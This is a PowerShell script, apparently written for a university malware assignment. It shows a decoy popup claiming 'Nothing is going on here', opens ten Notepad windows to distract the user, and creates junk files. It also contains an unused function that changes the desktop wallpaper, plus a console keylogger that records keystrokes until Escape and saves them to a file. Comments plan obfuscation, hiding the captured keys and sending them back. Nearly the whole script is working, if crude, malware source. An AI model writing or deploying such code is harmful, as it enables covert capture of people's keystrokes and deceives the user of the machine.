#Obsufcate the code useless functions, a lot of junk variables and 
#Need to alert if the application is working
function Alert {
    $wshell = New-Object -ComObject Wscript.Shell
    $Output = $wshell.Popup("Nothing is going on here", 0, "Nothing")
    $Output
}

#May add some function to read individual important parts of a computer or make more files or something as a note

#Used to send an array of keys, to then send back to the user, can be very basic
function Keylogger {
    $notpressed = $true
    #Array declared
    $keysnoted = [System.Collections.ArrayList]::new()
    #Will send a certain amount until certain key is pressed
    while ($notpressed) {
        #Noted the key stroke, is true to surpress the key strokes just puts in numbers
        $key = [System.Console]::ReadKey($true)
        #Check if the key that has been searched is completed
        if ($key.Key -eq [System.ConsoleKey]::Escape){
            $notpressed = $false
        }
        #Add to the string
        $keysnoted.Add($key.keychar)
    }
    #Will need to write to a new file created instead to store and try and hide more
    New-Item -ItemType File -Path "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1\copiedkeys.txt" -Value $($keysnoted -join '')
}

#Just used to distract the user
function OpeningNotepad {
    for ($i = 0; $i -lt 10; $i++) {
            Start-Process -FilePath "notepad.exe"
    }
}

#Change background of desktop
function ChangingDesktop {
    set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value accipiter.png
}

#Adds a bunch of files in a directory
function AddingFiles {
    for ($i = 0; $i -lt 10; $i++) {
        New-Item -ItemType File -Path "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1\copiedkeys[$i].txt" -Value "THESE ARE ALL RANDOM FILES"
    }
}

Write-Warning "This is a warning"
Alert
OpeningNotepad
AddingFiles
Keylogger